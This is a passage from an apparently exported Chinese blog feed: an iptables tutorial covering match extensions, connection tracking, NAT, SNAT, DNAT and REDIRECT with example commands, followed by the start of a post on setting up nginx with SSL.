隐式扩展</h4><p>iptables 在使用-p选项指明了特定的协议时，无需再用-m选项指明扩展模块的扩展机制，不需要手动加载扩展模块</p><blockquote><p><strong>tcp</strong> <strong>协议的扩展选项</strong></p><ul><li>[!] –source-port, –sport port[:port]：匹配报文源端口,可为端口连续范围</li><li>[!] –destination-port,–dport port[:port]：匹配报文目标端口,可为连续范围</li><li>[!] –tcp-flags mask comp</li></ul><p><strong>udp</strong> <strong>协议的扩展选项</strong></p><ul><li>[!] –source-port, –sport port[:port]：匹配报文的源端口或端口范围</li><li>[!] –destination-port,–dport port[:port]：匹配报文的目标端口或端口范围</li></ul><p> <strong>icmp</strong> <strong>协议的扩展选项</strong></p><ul><li>[!] –icmp-type {type[/code]|typename}</li></ul><p>    type/code</p><p>    <strong>0/0  echo-reply   icmp应答</strong></p><p>    <strong>8/0  echo-request icmp请求</strong></p></blockquote><h5 id="范例：端口规则"><a href="#范例：端口规则" class="headerlink" title="范例：端口规则"></a>范例：端口规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#允许10.0.0.6能访问80端口</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.6 -p tcp --dport 80 -j ACCEPT</span><br><br><span class="hljs-comment">#允许10.0.0.6能访问80-100的端口</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.6 -p tcp --dport 80:100 -j ACCEPT</span><br><br><span class="hljs-comment">#我能ping通10.0.0.6，10.0.0.6不能ping通我</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.6 -p icmp --icmp-type 0 -j ACCEPT</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.6 -j REJECT</span><br></code></pre></td></tr></table></figure><h4 id="3-4-2-显式扩展及相关模块"><a href="#3-4-2-显式扩展及相关模块" class="headerlink" title="3.4.2 显式扩展及相关模块"></a>3.4.2 显式扩展及相关模块</h4><p>显示扩展即必须<strong>使用-m选项指明要调用的扩展模块名称</strong>，需要手动加载扩展模块</p><blockquote><p> <strong>扩展模块的使用帮助：</strong></p><ul><li>CentOS 7,8: man iptables-extensions</li><li>CentOS 6: man iptables</li></ul></blockquote><h5 id="3-4-2-1-multiport扩展"><a href="#3-4-2-1-multiport扩展" class="headerlink" title="3.4.2.1 multiport扩展"></a>3.4.2.1 multiport扩展</h5><blockquote><p>以离散方式定义多端口匹配,最多指定15个端口</p><p>#指定多个源端口</p><ul><li>[!] –source-ports,<strong>–sports port</strong>[,port|,port:port]…</li></ul><p># 指定多个目标端口</p><ul><li>[!] –destination-ports,–dports port[,port|,port:port]…</li></ul><p>#多个源或目标端</p><ul><li>[!] –ports port[,port|,port:port]…</li></ul></blockquote><h6 id="范例：端口规则-1"><a href="#范例：端口规则-1" class="headerlink" title="范例：端口规则"></a>范例：端口规则</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#允许10.0.0.6能访问80和443端口</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.6 -p tcp -m multiport --dports 80,443 -j ACCEPT</span><br></code></pre></td></tr></table></figure><h5 id="3-4-2-2-iprange扩展"><a href="#3-4-2-2-iprange扩展" class="headerlink" title="3.4.2.2 iprange扩展"></a>3.4.2.2 iprange扩展</h5><blockquote><p>指明连续的（但一般不是整个网络）ip地址范围</p><ul><li>[!] –src-range from[-to] 源IP地址范围</li><li>[!] –dst-range from[-to] 目标IP地址范围</li></ul></blockquote><p><strong>范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -p tcp --dport 80 -m iprange --src-range 172.16.1.5-172.16.1.10 -j DROP</span><br></code></pre></td></tr></table></figure><h5 id="3-4-2-3-mac扩展"><a href="#3-4-2-3-mac扩展" class="headerlink" title="3.4.2.3 mac扩展"></a>3.4.2.3 mac扩展</h5><blockquote><p>mac 模块可以指明源MAC地址,，适用于：PREROUTING, FORWARD，INPUT chains</p><ul><li>[!] –mac-source XX:XX:XX:XX:XX:XX</li></ul></blockquote><p><strong>范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#允许MAC地址为00:50:56:12:34:56</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -m mac --mac-source 00:50:56:12:34:56 -j ACCEPT</span><br></code></pre></td></tr></table></figure><h5 id="3-4-2-4-string扩展"><a href="#3-4-2-4-string扩展" class="headerlink" title="3.4.2.4 string扩展"></a>3.4.2.4 string扩展</h5><blockquote><ul><li>对报文中的应用层数据做字符串模式匹配检测</li><li>–algo {bm|kmp} 字符串匹配检测算法</li></ul><p>  bm：Boyer-Moore</p><p>  kmp：Knuth-Pratt-Morris</p><ul><li>–from offset 开始偏移</li><li>–to offset  结束偏移</li><li>[!] –string pattern 要检测的字符串模式</li><li>[!] –hex-string pattern 要检测字符串模式，16进制格式</li></ul></blockquote><p><strong>范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#如果index.html含&quot;google&quot;,就拒绝</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A OUTPUT -m string --algo bm --from 62 --string &quot;google&quot; -j REJECT</span><br></code></pre></td></tr></table></figure><h5 id="3-4-2-5-time扩展"><a href="#3-4-2-5-time扩展" class="headerlink" title="3.4.2.5 time扩展"></a>3.4.2.5 time扩展</h5><p><strong>注意：****CentOS 8</strong> <strong>此模块有问题</strong></p><blockquote><ul><li>–datestart YYYY[-MM[-DD[Thh[:mm[:ss]]]]] 日期</li><li>–datestop YYYY[-MM[-DD[Thh[:mm[:ss]]]]]</li><li>–timestart hh:mm[:ss]    时间</li><li>–timestop hh:mm[:ss]</li><li>[!] –monthdays day[,day…]  每个月的几号</li><li>[!] –weekdays day[,day…]  星期几，1 – 7 分别表示星期一到星期日</li><li>–kerneltz：内核时区（当地时间），不建议使用，CentOS 7版本以上系统默认为 UTC</li></ul><p>注意： centos6 不支持kerneltz ，–localtz指定本地时区(默认)</p></blockquote><p><strong>范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos7 ~]<span class="hljs-comment"># iptables -A INPUT -m time --timestart 14:30 --timestop 18:30 --weekdays 1,2,3,4,5 -j REJECT</span><br></code></pre></td></tr></table></figure><h5 id="3-4-2-6-connlimit扩展"><a href="#3-4-2-6-connlimit扩展" class="headerlink" title="3.4.2.6 connlimit扩展"></a>3.4.2.6 connlimit扩展</h5><blockquote><p>根据每客户端IP做并发连接数数量匹配</p><p>可防止Dos(Denial of Service，拒绝服务)攻击</p><ul><li>–connlimit-upto N #连接的数量小于等于N时匹配</li><li>–connlimit-above N #连接的数量大于N时匹配</li></ul></blockquote><p><strong>范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#连接数量大于10就拒绝</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -m connlimit --connlimit-above 10 -j REJECT</span><br></code></pre></td></tr></table></figure><h5 id="3-4-2-7-limit扩展"><a href="#3-4-2-7-limit扩展" class="headerlink" title="3.4.2.7 limit扩展"></a>3.4.2.7 limit扩展</h5><blockquote><p>基于收发报文的速率做匹配 , 令牌桶过滤器</p><ul><li>–limit-burst number #前多少个包不限制</li><li>–limit #[/second|/minute|/hour|/day]</li></ul></blockquote><p><strong>范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1分钟限制10个报文，前5个不限制，第5个之后开始限流</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -p icmp -m limit --limit 10/minute --limit-burst 5 -j ACCEPT</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -I INPUT 2 -p icmp -j REJECT</span><br>[root@rocky01 ~]<span class="hljs-comment"># hostname -I</span><br>10.0.0.128<br><br><span class="hljs-comment">#测试</span><br>[root@ubuntu01 ~]<span class="hljs-comment"># ping 10.0.0.128</span><br>PING 10.0.0.128 (10.0.0.128) 56(84) bytes of data.<br>64 bytes from 10.0.0.128: icmp_seq=1 ttl=64 time=0.512 ms<br>64 bytes from 10.0.0.128: icmp_seq=2 ttl=64 time=0.728 ms<br>64 bytes from 10.0.0.128: icmp_seq=3 ttl=64 time=0.479 ms<br>64 bytes from 10.0.0.128: icmp_seq=4 ttl=64 time=0.876 ms<br>64 bytes from 10.0.0.128: icmp_seq=5 ttl=64 time=0.587 ms<br>From 10.0.0.128 icmp_seq=6 Destination Port Unreachable<br>64 bytes from 10.0.0.128: icmp_seq=7 ttl=64 time=0.662 ms<br>From 10.0.0.128 icmp_seq=8 Destination Port Unreachable<br>From 10.0.0.128 icmp_seq=9 Destination Port Unreachable<br>From 10.0.0.128 icmp_seq=10 Destination Port Unreachable<br>From 10.0.0.128 icmp_seq=11 Destination Port Unreachable<br>From 10.0.0.128 icmp_seq=12 Destination Port Unreachable<br>64 bytes from 10.0.0.128: icmp_seq=13 ttl=64 time=0.392 ms<br>From 10.0.0.128 icmp_seq=14 Destination Port Unreachable<br></code></pre></td></tr></table></figure><h5 id="3-4-2-8-state扩展"><a href="#3-4-2-8-state扩展" class="headerlink" title="3.4.2.8 state扩展"></a>3.4.2.8 state扩展</h5><blockquote><p>state 扩展模块，可以根据”连接追踪机制“去检查连接的状态，较耗资源</p><p>conntrack机制：追踪本机上的请求和响应之间的关系</p><p><strong>状态类型</strong></p><ul><li><strong>NEW：新发出请求；连接追踪信息库中不存在此连接的相关信息条目，因此，将其识别为第一次发出的请求</strong></li><li><strong>ESTABLISHED：NEW状态之后，连接追踪信息库中为其建立的条目失效之前期间内所进行的通信状态</strong></li><li><strong>RELATED：新发起的但与已有连接相关联的连接，如：ftp协议中的数据连接与命令连接之间的关系</strong></li><li>INVALID：无效的连接，如flag标记不正确</li><li>UNTRACKED：未进行追踪的连接，如：raw表中关闭追踪</li></ul></blockquote><h6 id="调整连接追踪功能所能够容纳的最大连接数量"><a href="#调整连接追踪功能所能够容纳的最大连接数量" class="headerlink" title="调整连接追踪功能所能够容纳的最大连接数量"></a>调整连接追踪功能所能够容纳的最大连接数量</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos8 ~]<span class="hljs-comment"># cat /proc/sys/net/netfilter/nf_conntrack_max</span><br>65536<br>[root@centos8 ~]<span class="hljs-comment"># cat /proc/sys/net/nf_conntrack_max</span><br>65536<br></code></pre></td></tr></table></figure><h6 id="范例-面试题"><a href="#范例-面试题" class="headerlink" title="范例: 面试题"></a>范例: 面试题</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos8 ~]<span class="hljs-comment"># echo 1 &gt; /proc/sys/net/netfilter/nf_conntrack_max</span><br>[root@centos8 ~]<span class="hljs-comment"># tail /var/log/messages </span><br>Jul  8 10:03:53 centos8 kernel: nf_conntrack: nf_conntrack: table full, dropping packet<br>[root@centos6 ~]<span class="hljs-comment"># tail /var/log/messages</span><br>Jul  8 09:51:16 centos6 kernel: nf_conntrack: table full, dropping packet.<br><br><span class="hljs-comment">#问：在日志中发现Jul  8 10:03:53 centos8 kernel: nf_conntrack: nf_conntrack: table full, dropping packet</span><br><span class="hljs-comment">#这条记录出现，为什么？</span><br><br><span class="hljs-comment">#解：连接过多的解决方法两个：</span><br>(1) 加大nf_conntrack_max 值<br>vim /etc/sysctl.conf<br>net.nf_conntrack_max = 393216<br>net.netfilter.nf_conntrack_max = 393216<br>(2) 降低 nf_conntrack <span class="hljs-built_in">timeout</span>时间<br>vim /etc/sysctl.conf<br>net.netfilter.nf_conntrack_tcp_timeout_established = 300<br>net.netfilter.nf_conntrack_tcp_timeout_time_wait = 120<br>net.netfilter.nf_conntrack_tcp_timeout_close_wait = 60<br>net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120<br>iptables -t nat -L -n<br></code></pre></td></tr></table></figure><h6 id="范例-单向通讯"><a href="#范例-单向通讯" class="headerlink" title="范例: 单向通讯"></a>范例: 单向通讯</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#我能访问你，你不能访问我</span><br><span class="hljs-comment">#方法一：单个</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.129 -m state --state NEW -j REJECT</span><br><br><span class="hljs-comment">#方法二：多个</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -I INPUT -m state --state ESTABLISHED -j ACCEPT</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -j REJECT</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-5-Target"><a href="#3-5-Target" class="headerlink" title="3.5 Target"></a>3.5 Target</h3><blockquote><p>target 包括以下类型：</p><ul><li>自定义链, ACCEPT， DROP， REJECT，RETURN,LOG，SNAT，DNAT，REDIRECT，MASQUERADE</li><li>LOG：非中断target,本身不拒绝和允许,放在拒绝和允许规则前，并将日志记录在/var/log/messages系统日志中</li><li>–log-level level  级别： debug，info，notice, warning, error, crit, alert,emerg</li><li>–log-prefix prefix 日志前缀，用于区别不同的日志，最多29个字符</li></ul></blockquote><hr><h3 id="3-6-规则优化最佳实践"><a href="#3-6-规则优化最佳实践" class="headerlink" title="3.6 规则优化最佳实践"></a>3.6 规则优化最佳实践</h3><blockquote><ol><li>安全放行所有入站和出站的状态为ESTABLISHED状态连接,建议放在第一条，效率更高</li><li>谨慎放行入站的新请求</li><li>有特殊目的限制访问功能，要在放行规则之前加以拒绝</li><li><strong>同类规则（访问同一应用，比如：http ），匹配范围小的放在前面，用于特殊处理</strong></li><li><strong>不同类的规则（访问不同应用，一个是http，另一个是mysql ），匹配范围大的放在前面，效率更高</strong></li><li>应该将那些可由一条规则能够描述的多个规则合并为一条,减少规则数量,提高检查效率</li><li>设置默认策略，建议白名单（只放行特定连接）</li></ol><ul><li><ul><li>iptables -P，不建议，容易出现“自杀现象”</li><li>规则的最后定义规则做为默认策略，推荐使用，放在最后一条</li></ul></li></ul></blockquote><hr><h3 id="3-7-iptables规则保存"><a href="#3-7-iptables规则保存" class="headerlink" title="3.7 iptables规则保存"></a>3.7 iptables规则保存</h3><p>使用iptables命令定义的规则，手动删除之前，其生效期限为kernel存活期限</p><blockquote><p><strong>持久保存规则</strong></p><ul><li>CentOS 7,8</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-save &gt; /PATH/TO/SOME_RULES_FILE<br></code></pre></td></tr></table></figure><ul><li>CentOS 6</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将规则覆盖保存至/etc/sysconfig/iptables文件中</span><br>service iptables save<br></code></pre></td></tr></table></figure><p><strong>加载规则</strong></p><ul><li>CentOS 7,8 重新载入预存规则文件中规则</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-restore &lt; /PATH/FROM/SOME_RULES_FILE<br></code></pre></td></tr></table></figure><ul><li>iptables-restore选项</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">-n, --noflush：不清除原有规则<br>-t, --<span class="hljs-built_in">test</span>：仅分析生成规则集，但不提交<br></code></pre></td></tr></table></figure><ul><li> CentOS 6</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#会自动从/etc/sysconfig/iptables 重新载入规则</span><br>service iptables restart<br></code></pre></td></tr></table></figure><p><strong>开机自动重载规则</strong></p><ul><li>用脚本保存各个iptables命令；让此脚本开机后自动运行**/etc/rc.d/rc.loca**l文件中添加脚本路径 /PATH/TO/SOME_SCRIPT_FILE</li><li>用规则文件保存各个规则，开机时自动载入此规则文件中的规则在/etc/rc.d/rc.local文件添加</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-restore &lt; /PATH/FROM/IPTABLES_RULES_FILE<br></code></pre></td></tr></table></figure><ul><li>定义Unit File, CentOS 7，8 可以安装 <strong>iptables-services</strong> 实现iptables.service</li></ul><p>范例: CentOS 7，8 使用 iptables-services</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装服务</span><br>[root@centos8 ~]<span class="hljs-comment"># yum -y install iptables-services</span><br><br><span class="hljs-comment">#备份</span><br>[root@centos8 ~]<span class="hljs-comment"># cp /etc/sysconfig/iptables&#123;,.bak&#125;</span><br><br><span class="hljs-comment">#保存现在的规则到文件中方法1</span><br>[root@centos8 ~]<span class="hljs-comment"># /usr/libexec/iptables/iptables.init save</span><br><br><span class="hljs-comment">#保存现在的规则到文件中方法2</span><br>[root@centos8 ~]<span class="hljs-comment"># iptables-save &gt; /etc/sysconfig/iptables</span><br><br><span class="hljs-comment">#开机启动</span><br>[root@centos8 ~]<span class="hljs-comment"># systemctl enable iptables.service    </span><br>[root@centos8 ~]<span class="hljs-comment"># systemctl mask firewalld.service nftables.service</span><br></code></pre></td></tr></table></figure></blockquote><hr><h3 id="3-8-网络防火墙"><a href="#3-8-网络防火墙" class="headerlink" title="3.8 网络防火墙"></a>3.8 网络防火墙</h3><p>iptables/netfilter 利用filter表的FORWARD链,可以充当网络防火墙</p><h4 id="3-8-1-FORWARD-链实现内外网络的流量控制"><a href="#3-8-1-FORWARD-链实现内外网络的流量控制" class="headerlink" title="3.8.1 FORWARD 链实现内外网络的流量控制"></a>3.8.1 FORWARD 链实现内外网络的流量控制</h4><h5 id="范例-实现内网访问可以访问外网-反之禁止"><a href="#范例-实现内网访问可以访问外网-反之禁止" class="headerlink" title="范例: 实现内网访问可以访问外网,反之禁止"></a>范例: 实现内网访问可以访问外网,反之禁止</h5><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221022151736334-206807770.png"><img src="2927659-20221022151736334-206807770.png" alt="img"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#一、从10.0.0.0/24网段到除了10.0.0.0/24网段的第一个包接收</span><br>[root@firewall ~]<span class="hljs-comment"># iptables -I FORWARD 1 -s 10.0.0.0/24 ! -d 10.0.0.0/24 -m state --state NEW -j ACCEPT</span><br><br><span class="hljs-comment">#二、接收所有ESTABLISHED的包</span><br>[root@firewall ~]<span class="hljs-comment"># iptables -I FORWARD 2 -m state --state ESTABLISHED -j ACCEPT</span><br><br><span class="hljs-comment">#三、外部网络到的10.0.0.7允许</span><br>[root@firewall ~]<span class="hljs-comment"># iptables -I FORWARD 3 ! -s 10.0.0.0/24 -d 10.0.0.7 -m state --state NEW -j ACCEPT</span><br><br><span class="hljs-comment">#四、</span><br>[root@firewall ~]<span class="hljs-comment"># iptables -I FORWARD 4 -j REJECT</span><br></code></pre></td></tr></table></figure><hr><h4 id="3-8-2-NAT-表"><a href="#3-8-2-NAT-表" class="headerlink" title="3.8.2 NAT 表"></a>3.8.2 NAT 表</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221022162202913-1703421813.png"><img src="2927659-20221022162202913-1703421813.png" alt="img"></a></p><blockquote><p>NAT: network address translation，支持PREROUTING，INPUT，OUTPUT，POSTROUTING四个链</p><p>请求报文：修改源/目标IP，由定义如何修改</p><p>响应报文：修改源/目标IP，根据跟踪机制自动实现</p><p>NAT的实现分为下面类型：</p><ul><li>SNAT：source NAT ，支持POSTROUTING, INPUT，让本地网络中的主机通过某一特定地址访问外部网络，实现地址伪装,请求报文：修改源IP</li><li>DNAT：destination NAT 支持PREROUTING , OUTPUT，把本地网络中的主机上的某服务开放给外部网络访问(发布服务和端口映射)，但隐藏真实IP,请求报文：修改目标IP</li><li>PNAT: port nat，端口和IP都进行修改</li></ul></blockquote><hr><h4 id="3-8-3-SNAT"><a href="#3-8-3-SNAT" class="headerlink" title="3.8.3 SNAT"></a>3.8.3 SNAT</h4><blockquote><p>SNAT：基于nat表的target，适用于固定的公网IP。<strong>适用于专线网络</strong></p><p>SNAT选项：</p><ul><li>–to-source [ipaddr[-ipaddr]][:port[-port]]</li><li>–random</li></ul><p>格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A POSTROUTING -s LocalNET ! -d LocalNet -j SNAT --to-source ExtIP<br></code></pre></td></tr></table></figure><p><strong>注意</strong><strong>:</strong> <strong>需要开启</strong> <strong>ip_forward</strong></p><p>范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A POSTROUTING -s 10.0.0.0/24 ! –d 10.0.0.0/24 -j SNAT --tosource 172.18.1.6-172.18.1.9<br></code></pre></td></tr></table></figure><p>MASQUERADE：基于nat表的target，<strong>适用于动态的公网IP，如：拨号网络。专线适用</strong></p><p>MASQUERADE选项：</p><ul><li>–to-ports port[-port]</li><li>–random</li></ul><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A POSTROUTING -s LocalNET ! -d LocalNet -j MASQUERADE<br></code></pre></td></tr></table></figure><p>范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A POSTROUTING -s 10.0.0.0/24 ! -d 10.0.0.0/24 -j MASQUERADE<br></code></pre></td></tr></table></figure></blockquote><h5 id="范例：查看本地主机访问公网时使用的IP"><a href="#范例：查看本地主机访问公网时使用的IP" class="headerlink" title="范例：查看本地主机访问公网时使用的IP"></a>范例：查看本地主机访问公网时使用的IP</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos8 ~]<span class="hljs-comment">#curl http://ifconfig.me</span><br>111.199.191.204<br><br>[root@centos8 ~]<span class="hljs-comment">#curl -L http://tool.lu/ip</span><br>当前IP: 111.199.191.204<br>归属地: 中国 北京 北京<br><br>[root@firewall ~]<span class="hljs-comment">#curl cip.cc</span><br>IP : 39.164.140.134<br>地址 : 中国 河南 鹤壁<br>运营商 : 移动<br>数据二 : 河南省郑州市 | 移动<br>数据三 : <br>URL : http://www.cip.cc/39.164.140.134<br></code></pre></td></tr></table></figure><hr><h4 id="3-8-4-DNAT"><a href="#3-8-4-DNAT" class="headerlink" title="3.8.4 DNAT"></a>3.8.4 DNAT</h4><blockquote><p><strong>DNAT：nat表的target，适用于端口映射，即可重定向到本机，也可以支持重定向至不同主机的不同端口</strong>，但不支持多目标，即不支持负载均衡功能</p><p>DNAT选项：</p><p>–to-destination [ipaddr[-ipaddr]][:port[-port]]</p><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A PREROUTING -d ExtIP -p tcp|udp --dport PORT -j DNAT --todestination InterSeverIP[:PORT]<br></code></pre></td></tr></table></figure><p><strong>注意</strong><strong>:</strong> <strong>需要开启</strong> <strong>ip_forward</strong></p><p>范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启用路由转发</span><br>[root@firewall ~]<span class="hljs-comment"># vim /etc/sysctl.conf </span><br>net.ipv4.ip_forward=1<br>[root@firewall ~]<span class="hljs-comment"># sysctl -p</span><br><br><span class="hljs-comment">#公网6.6.6.8访问内网10.0.0.7:80转发到内网10.0.0.7:8080</span><br>[root@firewall ~]<span class="hljs-comment"># iptables -t nat -A PREROUTING -d 6.6.6.8 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.7:8080</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="3-8-5-REDIRECT-转发"><a href="#3-8-5-REDIRECT-转发" class="headerlink" title="3.8.5 REDIRECT 转发"></a>3.8.5 REDIRECT 转发</h4><blockquote><p>REDIRECT，是NAT表的 target，通过改变目标IP和端口，将接受的包转发至同一个主机的不同端口，可用于PREROUTING OUTPUT链</p><p>REDIRECT选项：</p><ul><li>–to-ports port[-port]</li></ul><p>范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># hostname -I</span><br>10.0.0.128<br><br><span class="hljs-comment">#将访问本机的80端口转到8080端口</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -t nat -A PREROUTING -d 10.0.0.128 -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br></code></pre></td></tr></table></figure></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第九周</title>
    <link href="/2023/07/28/%E7%AC%AC%E4%B9%9D%E5%91%A8/"/>
    <url>/2023/07/28/%E7%AC%AC%E4%B9%9D%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="一、nginx实现全栈SSL。要求http-rewrite到https协议"><a href="#一、nginx实现全栈SSL。要求http-rewrite到https协议" class="headerlink" title="一、nginx实现全栈SSL。要求http rewrite到https协议"></a>一、nginx实现全栈SSL。要求http rewrite到https协议</h2><blockquote><p>Nginx 实现全栈 SSL，需要满足以下几个条件：</p><ol><li><strong>安装 Nginx 时需要添加 –with-http_ssl_module 参数</strong>。</li><li>准备 SSL 证书和私钥，证书可以从证书颁发机构购买，私钥可以使用 openssl 工具生成。</li><li>在 Nginx 配置文件中启用 SSL 模块，配置 SSL 证书和私钥的路径。</li><li>在 Nginx 配置文件中配置 HTTPS 服务器，并将 HTTP 请求重定向到 HTTPS 服务器。</li></ol></blockquote><h3 id="（1）编译安装nginx"><a href="#（1）编译安装nginx" class="headerlink" title="（1）编译安装nginx"></a>（1）编译安装nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装 Nginx 时，需要加上 --with-http_ssl_module 参数：</span><br>./configure 